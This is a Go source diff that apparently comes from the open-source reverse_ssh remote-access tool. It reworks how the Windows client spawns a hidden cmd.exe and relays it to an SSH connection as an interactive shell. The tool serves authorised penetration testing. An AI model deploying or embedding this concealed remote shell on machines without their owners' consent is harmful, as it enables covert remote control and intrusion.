@@ -2,11 +2,11 @@
 package client
 
 import (
-	"fmt"
 	"io"
 	"os/exec"
 	"syscall"
 
+	"github.com/NHAS/reverse_ssh/internal/server/terminal"
 	"github.com/NHAS/reverse_ssh/internal/server/users"
 	"github.com/NHAS/reverse_ssh/pkg/logger"
 	"golang.org/x/crypto/ssh"
@@ -27,88 +27,69 @@ func shellChannel(user *users.User, newChannel ssh.NewChannel, log logger.Logger
 	go func() {
 		defer connection.Close()
 
-		cmd := exec.Command("powershell.exe")
-		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		cmd := exec.Command("cmd.exe")
+		cmd.SysProcAttr = &syscall.SysProcAttr{
+			HideWindow:    true,
+			CreationFlags: syscall.STARTF_USESTDHANDLES,
+		}
 
 		stdout, err := cmd.StdoutPipe()
 		if err != nil {
-			log.Warning("Unable to get stdout pipe: %s", err)
+			log.Error("%s", err)
 			return
 		}
 
-		stderr, err := cmd.StderrPipe()
-		if err != nil {
-			log.Warning("Unable to get stderr pipe: %s", err)
-			return
-		}
-
-		go func() {
-			defer stderr.Close()
-			io.Copy(connection, stderr)
-		}()
-
-		go func() {
-			defer stdout.Close()
-
-			buff := make([]byte, 1024)
-			for {
-				n, _ := stdout.Read(buff)
-
-				_, err = connection.Write(buff[:n])
-				if err != nil {
-					log.Warning("Writing to connection failed: %s", err)
-					return
-				}
-			}
-		}()
+		cmd.Stderr = cmd.Stdout
 
 		stdin, err := cmd.StdinPipe()
 		if err != nil {
-			log.Warning("Unable to get stdin pipe: %s", err)
-
+			log.Error("%s", err)
 			return
 		}
 
-		go func() {
-			defer stdin.Close()
+		term := terminal.NewTerminal(connection, "")
 
-			buff := make([]byte, 1)
+		go func() {
+
+			buf := make([]byte, 128)
+
 			for {
 
-				_, err := connection.Read(buff)
-
+				n, err := stdout.Read(buf)
 				if err != nil {
-					log.Warning("Reading from connection failed: %s", err)
+					if err != io.EOF {
+						log.Error("%s", err)
+					}
 					return
 				}
 
-				fmt.Println(buff, string(buff))
-
-				if buff[0] == 127 {
-					stdin.Write([]byte{8, 0})
-					connection.Write(buff)
-					continue
-				}
-
-				connection.Write(buff)
-
-				if buff[0] == 13 {
-					stdin.Write([]byte{13, 10})
-					continue
-				}
-
-				_, err = stdin.Write(buff)
+				_, err = term.Write(buf[:n])
 				if err != nil {
-					log.Warning("Writing to stdin failed: %s", err)
+					log.Error("%s", err)
 					return
 				}
+
 			}
+		}()
+
+		go func() {
+
+			for {
+				//This will break if the user does CTRL+D apparently we need to reset the whole terminal if a user does this.... so just exit instead
+				line, err := term.ReadLine()
+				if err != nil {
+					log.Error("%s", err)
+					return
+				}
+				stdin.Write([]byte(line + "\r\n"))
+
+			}
+
 		}()
 
 		err = cmd.Run()
 		if err != nil {
-			log.Warning("Run returned an error: %s", err)
-			return
+			log.Error("%s", err)
 		}
 
 	}()
